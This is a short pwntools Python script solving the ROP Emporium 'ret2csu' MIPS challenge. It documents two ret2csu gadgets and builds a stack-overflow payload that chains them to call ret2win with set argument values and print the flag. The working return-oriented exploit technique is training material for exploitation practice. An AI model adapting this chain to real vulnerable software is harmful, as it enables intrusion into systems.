#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('ret2csu_mipsel')
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]

gs='''
b *pwnme+308
c
'''

# Gadgets
# Gadget1  
'''
 0x004009a0   lw t9, (s0) 
 0x004009a4   addiu s1, s1, 1
 0x004009a8   move a2, s5
 0x004009ac   move a1, s4
 0x004009b0   jalr t9
 0x004009b4   move a0, s3
 0x004009b8   bne s2, s1, 0x4009a0
 0x004009bc   addiu s0, s0, 4
 0x004009c0   lw ra, (var_34h)
 0x004009c4   lw s5, (var_30h)
 0x004009c8   lw s4, (var_2ch)
 0x004009cc   lw s3, (var_28h)
 0x004009d0   lw s2, (var_24h)
 0x004009d4   lw s1, (var_20h)
 0x004009d8   lw s0, (var_1ch)
 0x004009dc   jr ra
 0x004009e0   addiu sp, sp, 0x38
'''
gadget1 = 0x004009a0

'''
 Gadget2  
 0x004009c0   lw ra, (var_34h)
 0x004009c4   lw s5, (var_30h)
 0x004009c8   lw s4, (var_2ch)
 0x004009cc   lw s3, (var_28h)
 0x004009d0   lw s2, (var_24h)
 0x004009d4   lw s1, (var_20h)
 0x004009d8   lw s0, (var_1ch)
 0x004009dc   jr ra
 0x004009e0   addiu sp, sp, 0x38
'''
gadget2 = 0x004009c0

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


# Section .dynamic
dynamic_s = elf.get_section_by_name('.dynsym').header['sh_addr']
ret2win = elf.plt["ret2win"]

log.info(f"{ret2win=:x}")
log.info(f"{dynamic_s=:x}")

offset=0x24

PL=b"A"*offset
PL+=p32(gadget2)             # ra    
for _ in range(7):
	PL+=p32(0xdeadbeef)        
PL+=p32(dynamic_s+0x14)    # s0
PL+=p32(1)  			   # s1
PL+=p32(2)  			   # s2 prepare s1+1=s2
PL+=p32(0xdeadbeef)        # s3 => a0 ensuite
PL+=p32(0xcafebabe)        # s4 => a1 ensuite
PL+=p32(0xd00df00d)        # s5 => a2 ensuite
PL+=p32(gadget1)           # ra    

for _ in range(13):
	PL+=p32(0xdeadbeef)        
PL+=p32(ret2win)             # ra    

io.sendlineafter(b"> ", PL)


io.recvuntil(b"ROPE")
flag=io.recvline().decode()
log.success(f"flag : ROPE{flag}")
io.close()

